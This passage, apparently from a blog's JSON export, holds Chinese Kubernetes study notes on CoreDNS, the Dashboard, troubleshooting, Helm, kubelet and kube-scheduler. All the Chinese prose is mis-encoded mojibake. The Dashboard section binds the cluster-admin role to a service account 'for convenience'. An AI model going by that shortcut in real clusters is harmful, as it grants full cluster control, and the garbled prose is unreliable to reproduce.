--feature-gates å‚æ•°ï¼Œç”¨äºå¯ç”¨ä¸€äº›é¢å¤–çš„ç‰¹æ€§åœ¨ä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ kubeadm init --feature-gates CoreDNS=true åœ¨åˆ›å»ºé›†ç¾¤æ—¶å€™å¯ç”¨ CoreDNSã€‚è€Œåœ¨ 1.11 ç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨ kubeadm åˆ›å»ºé›†ç¾¤æ—¶ CoreDNS å·²ç»è¢«é»˜è®¤å¯ç”¨ï¼Œè¿™ä¹Ÿä»ä¾§é¢è¯æ˜äº† CoreDNS åœ¨ K8S ä¸­è¾¾åˆ°äº†ç”Ÿäº§å¯ç”¨çš„çŠ¶æ€æŸ¥çœ‹ CoreDNS çš„æ‰©å±•12// ä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹ K8S åŸæœ‰çš„ kube-dns æ‰€ä»¥æ ‡ç­¾å’Œ Service çš„åå­—éƒ½è¿˜ä½¿ç”¨äº† kube-dnsï¼Œä½†å®é™…åœ¨è¿è¡Œçš„åˆ™æ˜¯ CoreDNS kubectl -n kube-system get all -l k8s-app=kube-dns -o wideä½¿ç”¨ AlpineLinux çš„é•œåƒåˆ›å»ºä¸€ä¸ª Pod å¹¶è¿›å…¥å…¶ä¸­1234kubectl run alpine -it --rm --restart=&apos;Never&apos; --image=&apos;alpine&apos; sh apk add --no-cache bind-tools # å®‰è£…å®Œ dig å‘½ä»¤æ‰€åœ¨åŒ…ä¹‹åï¼Œä½¿ç”¨ dig å‘½ä»¤è¿›è¡ŒéªŒè¯/ # dig @10.32.0.2 saythx-redis.work.svc.cluster.local +noall +answeræ³¨æ„:1234åŸŸåè§£ææ˜¯å¯è·¨ Namespace çš„, æ˜¯å…¨å±€çš„, ä½†ä¸ä»£è¡¨ç½‘ç»œäº’é€šåŸŸåæœ‰ç‰¹å®šæ ¼å¼ å¯ä»¥çœ‹åˆ°åˆšæ‰æˆ‘ä»¬ä½¿ç”¨çš„å®Œæ•´åŸŸåæ˜¯ saythx-redis.work.svc.cluster.local , æ³¨æ„å¼€å¤´çš„ä¾¿æ˜¯ Service å.Namespace å å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ host å‘½ä»¤æŸ¥è¯¢: host -t srv saythx-redis.work é…ç½®å’Œç›‘æ§CoreDNS ä½¿ç”¨ ConfigMap çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œä½†æ˜¯å¦‚æœæ›´æ”¹äº†é…ç½®ï¼ŒPod é‡å¯åæ‰ä¼šç”Ÿæ•ˆæŸ¥çœ‹é…ç½®:1kubectl -n kube-system get configmap coredns -o yamlCorefile ä¾¿æ˜¯å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å®ƒå¯åŠ¨äº†ç±»ä¼¼ kubernetes, prometheus ç­‰æ’ä»¶ã€‚æ³¨æ„ kubernetes æ’ä»¶çš„é…ç½®ï¼Œä½¿ç”¨çš„åŸŸæ˜¯ cluster.local ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šé¢æˆ‘ä»¬æåˆ°åŸŸåæ ¼å¼æ—¶å€™ååŠéƒ¨åˆ†æœªè§£é‡Šçš„éƒ¨åˆ†ã€‚è‡³äº prometheus æ’ä»¶ï¼Œåˆ™æ˜¯ç›‘å¬åœ¨ 9153 ç«¯å£ä¸Šæä¾›äº†ç¬¦åˆ Prometheus æ ‡å‡†çš„ metrics æ¥å£ï¼Œå¯ç”¨äºç›‘æ§ç­‰ã€‚ä½¿ç”¨ CoreDNS ä»£æ›¿ kube-dns ä¸»è¦æ˜¯ä¸ºäº†è§£å†³ä¸€äº› kube-dns æ—¶æœŸçš„é—®é¢˜ï¼Œæ¯”å¦‚è¯´åŸå…ˆ kube-dns çš„æ—¶å€™ï¼Œä¸€ä¸ª Pod ä¸­è¿˜éœ€è¦åŒ…å« kube-dns, sidecar å’Œ dnsmasq çš„å®¹å™¨ï¼Œè€Œæ¯å½“ dnsmasq å‡ºç°æ¼æ´æ—¶ï¼Œå°±ä¸å¾—ä¸è®© K8S å‘ä¸ªå®‰å…¨è¡¥ä¸æ‰èƒ½è¿›è¡Œæ›´æ–°ã€‚CoreDNS æœ‰ä¸°å¯Œçš„æ’ä»¶ï¼Œå¯ä»¥æ»¡è¶³æ›´å¤šæ ·çš„åº”ç”¨éœ€æ±‚ï¼ŒåŒæ—¶ kubernetes æ’ä»¶è¿˜åŒ…å«äº†ä¸€äº›ç‹¬ç‰¹çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ Pod éªŒè¯ä¹‹ç±»çš„ï¼Œå¯å¢åŠ å®‰å…¨æ€§ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"Dashboard","slug":"history/tech/5cb97c11ad4dd4c72f84f5be","date":"2019-04-18T19:43:13.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb97c11ad4dd4c72f84f5be/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb97c11ad4dd4c72f84f5be/","excerpt":"","text":"å®˜æ–¹é“¾æ¥ï¼šhttps://github.com/kubernetes/dashboardDashboard çš„åç«¯ä½¿ç”¨äº† K8S çš„ client-go ï¼Œå‰ç«¯ä¸»è¦ä½¿ç”¨äº† Angularå®‰è£…æ–¹æ³•ï¼š1kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yamlæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ:1kubectl -n kube-system get all -l k8s-app=kubernetes-dashboardä»¥å½“å‰çš„éƒ¨ç½²æ–¹å¼ï¼ŒService ä½¿ç”¨äº† ClusterIP çš„ç±»å‹ï¼Œæ‰€ä»¥åœ¨é›†ç¾¤å¤–ä¸èƒ½ç›´æ¥è®¿é—®ã€‚æˆ‘ä»¬å…ˆä½¿ç”¨ kubectl æä¾›çš„ port-forward åŠŸèƒ½è¿›è¡Œè®¿é—®:1kubectl -n kube-system port-forward pod/kubernetes-dashboard-67896bc598-dhdpz 8443æŸ¥çœ‹ token ä½¿ç”¨ä»¤ç‰Œç™»å½•1kubectl -n kube-system get serviceaccount -l k8s-app=kubernetes-dashboard -o yamlæŸ¥çœ‹ serviceaccount å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰é…ç½® secrets, æŸ¥çœ‹è¯¥ secret è¯¦æƒ…è·å¾— Token:1kubectl -n kube-system describe secrets kubernetes-dashboard-token-6ck2læƒé™æŠ¥é”™ï¼š1configmaps is forbidden: User &quot;system:serviceaccount:kube-system:kubernetes-dashboard&quot; cannot list resource &quot;configmaps&quot; in API group &quot;&quot; in the namespace &quot;default&quot; ã€‚æˆæƒ:åˆ›å»º ServiceAccountï¼š12345apiVersion: v1kind: ServiceAccountmetadata: name: admin-user namespace: kube-systemåˆ›å»º RoleBinding: è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ç»‘å®šäº† cluster-admin çš„ ClusterRole:123456789101112 apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: admin-userroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- kind: ServiceAccount name: admin-user namespace: kube-systemä½¿ç”¨ä»¥ä¸Šé…ç½®åˆ›å»ºç”¨æˆ·å’Œç»‘å®šï¼Œç„¶åè¿˜æ˜¯åŒæ ·çš„åŠæ³•è·å– Token","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s Troubleshoot","slug":"history/tech/5cb978aead4dd4c72f84f5bd","date":"2019-04-18T19:28:46.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb978aead4dd4c72f84f5bd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb978aead4dd4c72f84f5bd/","excerpt":"","text":"åº”ç”¨éƒ¨ç½²é—®é¢˜12kubectl -n work describe pod/saythx-redis-xxx // describekubectl -n work get events // æŸ¥çœ‹ Eventsã€‚kubelet æˆ–è€… kube-scheduler ç­‰ç»„ä»¶ä¼šæ¥å—æŸäº›äº‹ä»¶ç­‰ï¼Œevent ä¾¿æ˜¯ç”¨äºè®°å½•é›†ç¾¤å†…å„å¤„å‘ç”Ÿçš„äº‹ä»¶ä¹‹ç±»çš„ä¿®æ­£é”™è¯¯ä¿®æ­£é…ç½®æ–‡ä»¶1kubectl apply -f redis-deployment.yamlåœ¨çº¿ä¿®æ”¹é…ç½®12// è¿™ç§åšæ³•æ¯”è¾ƒé€‚åˆæ¯”è¾ƒç´§æ€¥æˆ–è€…èµ„æºæ˜¯ç›´æ¥é€šè¿‡å‘½ä»¤è¡Œåˆ›å»ºç­‰æƒ…å†µã€‚ éç‰¹æ®Šæƒ…å†µå°½é‡ä¸è¦åœ¨çº¿ä¿®æ”¹kubectl -n work edit deploy/saythx-redisæµ‹è¯•:123// --net host æ˜¯ä½¿ç”¨å®¿ä¸»æœºç½‘ç»œï¼› --rm è¡¨ç¤ºåœæ­¢å®Œåå³æ¸…é™¤ï¼› -it åˆ†åˆ«è¡¨ç¤ºè·å–è¾“å…¥åŠè·å– TTYdocker run --rm -it --net host redis redis-cli -p 32355127.0.0.1:32355&gt; pingå¦å¤–ä¸€ç§æ’æŸ¥æ€è·¯:1kubectl -n work get endpoints é›†ç¾¤é—®é¢˜æŸ¥çœ‹é›†ç¾¤ä¸­èŠ‚ç‚¹çš„çŠ¶æ€ï¼š1kubectl get node/node01 -o yaml","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Container Runtime","slug":"history/tech/5cb97052ad4dd4c72f84f5bc","date":"2019-04-18T18:53:06.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb97052ad4dd4c72f84f5bc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb97052ad4dd4c72f84f5bc/","excerpt":"","text":"ä¸ºäº†é¿å… K8S ç»‘å®šäºç‰¹å®šçš„å®¹å™¨è¿è¡Œæ—¶ï¼Œæ‰€ä»¥ä¾¿æˆç«‹äº† Open Container Initiative (OCI) ç»„ç»‡CRI ä¸»è¦æ˜¯åŸºäº gRPC å®ç°äº† RuntimeService å’Œ ImageService è¿™ä¸¤ä¸ªæœåŠ¡ï¼Œå¯ä»¥å‚è€ƒ pkg/kubelet/apis/cri/runtime/v1alpha2/api.proto ä¸­çš„ API å®šä¹‰åªè¦ç»§ç»­å°† kubelet å½“ä½œ agent çš„è§’è‰²ï¼Œè€Œå®ƒä¸åŸºäº CRI å®ç°çš„ CRI shim æœåŠ¡è¿›è¡Œé€šä¿¡ç†è§£å³å¯å½“å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„æ˜¯ Dockerï¼Œå½“å‰è¿˜æ”¯æŒçš„ä¸»è¦æœ‰ runcï¼ŒContainerdï¼ŒrunV ä»¥åŠ rkt ç­‰æŸ¥çœ‹ pod çš„ Events:pull é•œåƒ, åˆ›å»ºé•œåƒå¹¶å¯åŠ¨12kubectl run redis --image=rediskubectl describe pod/redis-658d78cf9c-kl7wzå‚è€ƒèµ„æ–™ï¼šhttps://moelove.info/2018/11/23/runc-1.0-rc6-å‘å¸ƒä¹‹é™…/https://raw.githubusercontent.com/tao12345666333/slides/master/2018.09.13-Tech-Talk-Time/Dockerå®æˆ˜å’ŒåŸºæœ¬åŸç†-å¼ æ™‹æ¶›.pdf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"ä»¥ Helm éƒ¨ç½²é¡¹ç›®","slug":"history/tech/5cb7f195027cba84434ae7bd","date":"2019-04-18T03:40:05.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb7f195027cba84434ae7bd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb7f195027cba84434ae7bd/","excerpt":"","text":"ç¼–å†™chartåˆ›å»ºæ¨¡æ¿ï¼š1helm create &lt;chatname&gt;æŸ¥çœ‹æ¨¡æ¿ï¼š1234567891011121314tree -a.â”œâ”€â”€ charts // ä¾èµ–çš„ chartâ”œâ”€â”€ Chart.yamlâ”œâ”€â”€ .helmignore / /å¿½ç•¥æ‰ä¸æƒ³åŒ…å«åœ¨ chart å†…çš„æ–‡ä»¶â”œâ”€â”€ templates // chart ä½¿ç”¨çš„æ¨¡æ¿æ–‡ä»¶, ä¸­é—´ä½¿ç”¨ - è¿›è¡Œåˆ†å‰²ï¼Œé¿å…ä½¿ç”¨é©¼å³°å¼å‘½åâ”‚ â”œâ”€â”€ deployment.yamlâ”‚ â”œâ”€â”€ _helpers.tplâ”‚ â”œâ”€â”€ ingress.yamlâ”‚ â”œâ”€â”€ NOTES.txt // Notes.txt æ–‡ä»¶åœ¨ helm install å®Œæˆåï¼Œä¼šè¿›è¡Œå›æ˜¾ï¼Œå¯ç”¨äºè§£é‡Šè¯´æ˜å¦‚ä½•è®¿é—®æœåŠ¡ç­‰â”‚ â”œâ”€â”€ service.yamlâ”‚ â””â”€â”€ testsâ”‚ â””â”€â”€ test-connection.yamlâ””â”€â”€ values.yaml // é¡¹ç›®çš„ä¸€äº›å¯é…ç½®é¡¹ï¼Œå¦‚é•œåƒçš„åç§°æˆ– tagæŸ¥çœ‹ Chart æ–‡ä»¶:123456cat &lt;chatname&gt;/Chart.yaml apiVersion: v1 appVersion: &quot;1.0&quot; description: A Helm chart for Kubernetes name: &lt;chatname&gt; version: 0.1.0Chart.yaml å­—æ®µè§£é‡Š:12345apiVersionï¼šç›®å‰ç‰ˆæœ¬éƒ½ä¸º v1appVersionï¼šè¿™æ˜¯åº”ç”¨çš„ç‰ˆæœ¬å·ï¼Œéœ€è¦ä¸ apiVersionï¼Œ version ç­‰å­—æ®µæ³¨æ„åŒºåˆ†name: é€šå¸¸è¦æ±‚ chart çš„åå­—å¿…é¡»å’Œå®ƒæ‰€åœ¨ç›®å½•ä¿æŒä¸€è‡´ï¼Œä¸”æ­¤å­—æ®µå¿…é¡»versionï¼šè¡¨æ˜å½“å‰ chart çš„ç‰ˆæœ¬å·ï¼Œä¼šç›´æ¥å½±å“ Release çš„è®°å½•ï¼Œä¸”æ­¤å­—æ®µå¿…é¡»descriptionï¼šæè¿° éƒ¨ç½²ä¸æ‰“åŒ…123helm install &lt;chatname&gt;helm package &lt;chatname&gt; //æ‰“åŒ…helm install &lt;chatname&gt;-0.1.0.tgzå‚è€ƒèµ„æ–™ï¼šhttps://github.com/tao12345666333/saythx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubelet","slug":"history/tech/5cb87003027cba84434ae7c1","date":"2019-04-18T00:39:31.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb87003027cba84434ae7c1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb87003027cba84434ae7c1/","excerpt":"","text":"12345678910111213141516+--------------------------------------------------------+ | +---------------------+ +---------------------+ | | | kubelet | | kube-proxy | | | | | | | | | +---------------------+ +---------------------+ | | +----------------------------------------------------+ | | | Container Runtime (Docker) | | | | +---------------------+ +---------------------+ | | | | |Pod | |Pod | | | | | | +-----+ +-----+ | |+-----++-----++-----+| | | | | | |C1 | |C2 | | ||C1 ||C2 ||C3 || | | | | | | | | | | || || || || | | | | | +-----+ +-----+ | |+-----++-----++-----+| | | | | +---------------------+ +---------------------+ | | | +----------------------------------------------------+ | +--------------------------------------------------------+ èŠ‚ç‚¹ç®¡ç†æ‰§è¡Œ kubelet --help çš„æ—¶å€™ï¼Œä¼šçœ‹åˆ°å®ƒæ‰€æ”¯æŒçš„å¯é…ç½®å‚æ•°ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª --register-node å‚æ•°ä¾¿æ˜¯ç”¨äºæ§åˆ¶æ˜¯å¦å‘ kube-apiserver æ³¨å†ŒèŠ‚ç‚¹çš„ï¼Œé»˜è®¤æ˜¯å¼€å¯çš„å½“ kubeadm join æ‰§è¡ŒæˆåŠŸåï¼Œä¾¿å¯ä»¥é€šè¿‡ kubectl get node æŸ¥çœ‹åˆ°æ–°åŠ å…¥é›†ç¾¤ä¸­çš„ Nodeåœ¨èŠ‚ç‚¹ä¸Šé€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ kubelet çš„çŠ¶æ€:1systemctl status kubeletæŸ¥çœ‹ Node ä¿¡æ¯:1kubectl get nodes | awk &apos;&#123;if(NR&gt;1)print&#125;&apos;| awk &#123;&apos;print $1&apos;&#125; | xargs -I &#123;&#125; kubectl get nodes &#123;&#125; -o yamlæŸ¥çœ‹é…ç½®æ–‡ä»¶:1cat /var/lib/kubelet/config.yamlé…ç½®è¯´æ˜:https://kubernetes.io/docs/tasks/administer-cluster/out-of-resource/1234maxPodsï¼šæœ€å¤§çš„ Pod æ•°healthzBindAddress å’Œ healthzPortï¼šé…ç½®äº†å¥åº·æ£€æŸ¥æ‰€ç›‘å¬çš„åœ°å€å’Œç«¯å£authentication å’Œ authorization ï¼šè®¤è¯æˆæƒç›¸å…³evictionHardï¼šæ¶‰åŠåˆ° kubelet çš„é©±é€ç­–ç•¥ï¼Œå¯¹ Pod è°ƒåº¦åˆ†é…ä¹‹ç±»çš„å½±å“å¾ˆå¤§éªŒè¯æ–¹å¼ï¼š1curl 127.0.0.1:10248/healthz Pod ç®¡ç†kube-scheduler å¤„ç†äº† Pod åº”è¯¥è°ƒåº¦è‡³å“ªä¸ª Nodeï¼Œè€Œ kubelet åˆ™æ˜¯ä¿éšœè¯¥ Pod èƒ½æŒ‰ç…§é¢„æœŸï¼Œåœ¨å¯¹åº” Node ä¸Šå¯åŠ¨å¹¶ä¿æŒå·¥ä½œå¦å¤– kubelet å…¶å®è¿˜æ‰¿æ‹…ç€æ¸…ç† Node ä¸Šä¸€äº›ç”± K8S è°ƒåº¦ Pod æ‰€é€ æˆçš„ç£ç›˜å ç”¨ä¹‹ç±»çš„å·¥ä½œkubelet åœ¨ä¿éšœ Pod èƒ½æŒ‰é¢„æœŸå·¥ä½œï¼Œä¸»è¦æ˜¯åšäº†ä¸¤æ–¹é¢çš„äº‹æƒ…ï¼šå¥åº·æ£€æŸ¥ï¼šé€šè¿‡ LivenessProbe å’Œ ReadinessProbe æ¢é’ˆè¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­æ˜¯å¦å¥åº·åŠæ˜¯å¦å·²ç»å‡†å¤‡å¥½æ¥å—è¯·æ±‚ã€‚èµ„æºç›‘æ§ï¼šé€šè¿‡ cAdvisor è¿›è¡Œèµ„æºç›‘æ§kubelet çš„ä½œç”¨ä¹‹ä¸€æ˜¯è´Ÿè´£é•œåƒæ‹‰å–ï¼Œåœ¨é•œåƒæ–¹é¢çš„é”™è¯¯ä¸»è¦é¢„è®¾äº† 6 ç§:123456ImagePullBackOffImageInspectErrorErrImagePullErrImageNeverPullRegistryUnavailableInvalidImageName","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kube-scheduler","slug":"history/tech/5cb86abb027cba84434ae7c0","date":"2019-04-18T00:16:59.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb86abb027cba84434ae7c0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb86abb027cba84434ae7c0/","excerpt":"","text":"1234567891011121314151617+----------------------------------------------------------+ | Master | | +-------------------------+ | | +-------&gt;| API Server |&lt;--------+ | | | | | | | | v +-------------------------+ v | | +----------------+ ^ +--------------------+ | | | | | | | | | | Scheduler | | | Controller Manager | | | | | | | | | | +----------------+ v +--------------------+ | | +------------------------------------------------------+ | | | | | | | Cluster state store | | | | | | | +------------------------------------------------------+ | +----------------------------------------------------------+Controller Manager è´Ÿè´£å°†é›†ç¾¤è°ƒæ•´è‡³é¢„æœŸçš„çŠ¶æ€ï¼Œè€Œ Scheduler åˆ™æ˜¯é›†ç¾¤è°ƒåº¦å™¨ï¼Œå°†é¢„æœŸçš„ Pod èµ„æºè°ƒåº¦åˆ°æ­£ç¡®çš„ Node èŠ‚ç‚¹ä¸Šï¼Œè¿›è€Œä»¤è¯¥ Pod å¯å®Œæˆå¯åŠ¨kube-scheduler æ˜¯ä¸€ä¸ªç­–ç•¥ä¸°å¯Œï¼Œæ‹“æ‰‘æ„ŸçŸ¥çš„è°ƒåº¦ç¨‹åºï¼Œä¼šæ˜¾è‘—å½±å“å¯ç”¨æ€§ï¼Œæ€§èƒ½å’Œå®¹é‡æœåŠ¡ç«¯äºŒè¿›åˆ¶æ–‡ä»¶è§£å‹åï¼Œä¾¿å¯çœ‹åˆ° kube-scheduler çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å½“ç»™å®ƒä¼ é€’ --help æŸ¥çœ‹å…¶æ”¯æŒå‚æ•°çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥çœ‹åˆ°å®ƒæ”¯æŒä½¿ç”¨ --address æˆ–è€… --bind-address ç­‰å‚æ•°æŒ‡å®šæ‰€å¯åŠ¨çš„ HTTP server æ‰€ç»‘å®šçš„åœ°å€ä¹‹ç±»çš„ã€‚å®ƒå’Œ kube-controller-manager æœ‰ç‚¹ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯é€šè¿‡å®šæ—¶çš„å‘ kube-apiserver è¯·æ±‚è·å–ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚è€Œä»–ä»¬æ‰€èµ·åˆ°çš„ä½œç”¨å¹¶ä¸ç›¸åŒä»ä¸Šå±‚çš„è§’åº¦æ¥çœ‹ï¼Œkube-scheduler çš„ä½œç”¨å°±æ˜¯å°†å¾…è°ƒåº¦çš„ Pod è°ƒåº¦è‡³æœ€ä½³çš„ Node ä¸Šï¼Œè€Œè¿™ä¸ªè¿‡ç¨‹ä¸­åˆ™éœ€è¦æ ¹æ®ä¸åŒçš„ç­–ç•¥ï¼Œè€ƒè™‘åˆ° Node çš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œæ¯”å¦‚ç«¯å£ï¼Œå†…å­˜ï¼Œå­˜å‚¨ç­‰å½“å®é™…è¿›è¡Œéƒ¨ç½²æ“ä½œçš„æ—¶å€™ï¼Œé¦–å…ˆä¼šé€šè¿‡ kubectl ä¹‹ç±»çš„å®¢æˆ·ç«¯å·¥å…·ä¸ kube-apiserver è¿›è¡Œäº¤äº’ï¼Œåœ¨ç»è¿‡ä¸€ç³»åˆ—çš„å¤„ç†åï¼Œæ•°æ®å°†æŒä¹…åŒ–åˆ° etcd ä¸­ï¼›æ­¤æ—¶ï¼Œkube-controller-manager é€šè¿‡æŒç»­çš„è§‚å¯Ÿï¼Œå¼€å§‹æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®ï¼Œå°†é›†ç¾¤çš„çŠ¶æ€è°ƒæ•´è‡³é¢„æœŸçŠ¶æ€ï¼›è€Œ kube-scheduler ä¹Ÿåœ¨å‘æŒ¥ä½œç”¨ï¼Œå†³å®š Pod åº”è¯¥è°ƒåº¦è‡³å“ªä¸ªæˆ–è€…å“ªäº› Node ä¸Šï¼›ä¹‹ååˆ™é€šè¿‡å…¶ä»–ç»„ä»¶çš„åä½œï¼Œæœ€æ€»å°†è¯¥ Pod åœ¨ç›¸åº”çš„ Node ä¸Šéƒ¨ç½²å¯åŠ¨ å¤„ç†é˜¶æ®µkube-scheduler å°†å¤„ç†é˜¶æ®µä¸»è¦åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ Computing predicatesï¼ŒPrioritizingå’Œ Selecting hostï¼š123456789Computing predicatesï¼š&gt;ä¸»è¦è§£å†³çš„é—®é¢˜æ˜¯ Pod èƒ½å¦è°ƒåº¦åˆ°é›†ç¾¤çš„ Node ä¸Šï¼›ä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªåä¸º podFitsOnNode çš„å‡½æ•°è¿›è¡Œå®ç°ï¼Œåœ¨æ£€æŸ¥çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šå…ˆå»æ£€æŸ¥ä¸‹æ˜¯å¦å·²ç»æœ‰å·²ç¼“å­˜çš„åˆ¤æ–­ç»“æœï¼Œ å½“ç„¶ä¹Ÿä¼šæ£€æŸ¥ Pod æ˜¯å¦æ˜¯å¯è°ƒåº¦çš„ï¼Œä»¥é˜²æœ‰ Pod Affinity (äº²åˆæ€§) ä¹‹ç±»çš„å­˜åœ¨ã€‚Prioritizingï¼š&gt;ä¸»è¦è§£å†³çš„é—®é¢˜æ˜¯åœ¨ä¸Šä¸ªé˜¶æ®µé€šè¿‡ findNodesThatFit å¾—åˆ°äº† filteredNodes çš„åŸºç¡€ä¹‹ä¸Šè§£å†³å“ªäº› Node æ˜¯æœ€ä¼˜çš„ï¼Œå¾—åˆ°ä¸€ä¸ªä¼˜å…ˆçº§åˆ—è¡¨ priorityList;è‡³äºä¼˜å…ˆçº§çš„éƒ¨åˆ†ï¼Œä¸»è¦æ˜¯é€šè¿‡ä¸‹é¢çš„ä»£ç ï¼š// ç»™æ¯ä¸ªç»è¿‡ç¬¬ä¸€æ­¥ç­›é€‰å‡ºæ¥çš„ Node ä¸€ä¸ª Scoreï¼Œå†æŒ‰ç…§å„ç§æ¡ä»¶è¿›è¡Œæ‰“åˆ†ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªä¼˜å…ˆçº§åˆ—è¡¨ã€‚ for i := range nodes { result = append(result, schedulerapi.HostPriority{Host: nodes[i].Name, Score: 0}) for j := range priorityConfigs { result[i].Score += results[j][i].Score * priorityConfigs[j].Weight } } 1234Selecting hostï¼š&gt;æœ€é€šè¿‡ selectHost æœ€ç»ˆé€‰æ‹© Node è°ƒåº¦åˆ°å“ªå°æœºå™¨ä¸Šfunc (g *genericScheduler) selectHost(priorityList schedulerapi.HostPriorityList) (string, error) {if len(priorityList) == 0 {return â€œâ€, fmt.Errorf(â€œempty priorityListâ€)}sort.Sort(sort.Reverse(priorityList)) maxScore := priorityList[0].Score firstAfterMaxScore := sort.Search(len(priorityList), func(i int) bool { return priorityList[i].Score &lt; maxScore }) g.lastNodeIndexLock.Lock() ix := int(g.lastNodeIndex % uint64(firstAfterMaxScore)) g.lastNodeIndex++ g.lastNodeIndexLock.Unlock() return priorityList[ix].Host, nil }å‚è€ƒèµ„æ–™ï¼š &lt;https://kubernetes.io/docs/reference/command-line-tools-reference/kube-scheduler/&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"controller-manager","slug":"history/tech/5cb827e9027cba84434ae7bf","date":"2019-04-17T19:31:53.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb827e9027cba84434ae7bf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb827e9027cba84434ae7bf/","excerpt":"","text":"1234567891011121314151617+----------------------------------------------------------+ | 